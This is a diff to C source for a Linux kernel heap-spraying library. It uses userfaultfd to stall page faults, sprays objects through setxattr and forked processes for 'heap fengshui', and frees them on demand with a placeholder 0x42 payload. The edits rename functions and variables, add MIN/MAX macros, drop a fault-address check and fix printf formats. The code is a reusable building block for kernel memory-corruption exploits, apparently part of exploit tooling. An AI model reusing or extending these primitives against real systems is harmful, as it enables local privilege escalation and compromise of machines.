@@ -3,6 +3,8 @@
 
 #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                         } while (0)
+#define MIN(X, Y) ((X) >= (Y) ? (Y) : (X))
+#define MAX(X, Y) ((X) >= (Y) ? (X) : (Y))
 
 static int page_size, i=0;
 static pthread_mutex_t order_lock;
@@ -77,18 +79,13 @@ fault_handler_thread(void *arg)
             exit(EXIT_FAILURE);
         }
 
-        if (addr + page_size != msg.arg.pagefault.address) {
-            printf("Trigger %llx\n", msg.arg.pagefault.address);
-            continue;
-        }
-
 #ifdef DEBUG
-        printf("[+] hang->%d from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
+        printf("[+] hang->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
 #endif
         pthread_mutex_unlock(&order_lock);
         pthread_mutex_lock(lock[id]); 
 #ifdef DEBUG
-        printf("[+] unlock->%d from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
+        printf("[+] unlock->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
 #endif
 
         /* Display info about the page-fault event */
@@ -111,7 +108,7 @@ fault_handler_thread(void *arg)
 }
 
 void init_heap_spray(int _objectSize, char* _payload, int _payloadSize) {
-    default_round = OBJS_EACH_ROUND;
+    default_objs_num = OBJS_EACH_ROUND;
     if (_payloadSize > _objectSize) {
         printf("[-] The length of payload should not exceed the object");
         exit(0);
@@ -126,7 +123,7 @@ void init_heap_spray(int _objectSize, char* _payload, int _payloadSize) {
     pthread_mutex_init(&order_lock, NULL);
 }
 
-void do_heap_fengshui(int loop) {
+void do_heap_spray(int loop) {
     if (objectSize == 0) {
         printf("[-] objectSize is zero");
         return;
@@ -138,9 +135,9 @@ void do_heap_fengshui(int loop) {
     }
 
     printf("[+] Prepare for heap fengshui...\n");
-    fork_and_spray(loop, default_round, 0, 1);
+    fork_and_spray(loop, default_objs_num, 0, 1);
     printf("[+] Prepare for heap fengshui...Done\n");
-    sleep(MAX(1, default_round/50));
+    sleep(MAX(1, default_objs_num/50));
 }
 
 static void *spray_setxattr(void *arg) {
@@ -176,7 +173,7 @@ void do_free(u_int64_t val) {
         pthread_mutex_lock(&order_lock);
         pthread_mutex_unlock(lock[id]);
 #ifdef DEBUG
-        printf("free->%d\n", id);
+        printf("free->%ld\n", id);
 #endif
     } else {
         void *lock_addr = val;
@@ -294,7 +291,7 @@ int main()
 {
   char *fengshuiPayload = "\x42\x42\x42\x42\x42\x42\x42\x42";
   init_heap_spray(128, fengshuiPayload, 8);
-  //do_heap_fengshui(5);
+  //do_heap_spray(5);
   do_spray(10, 0);
   do_free(1);
   do_free(2);
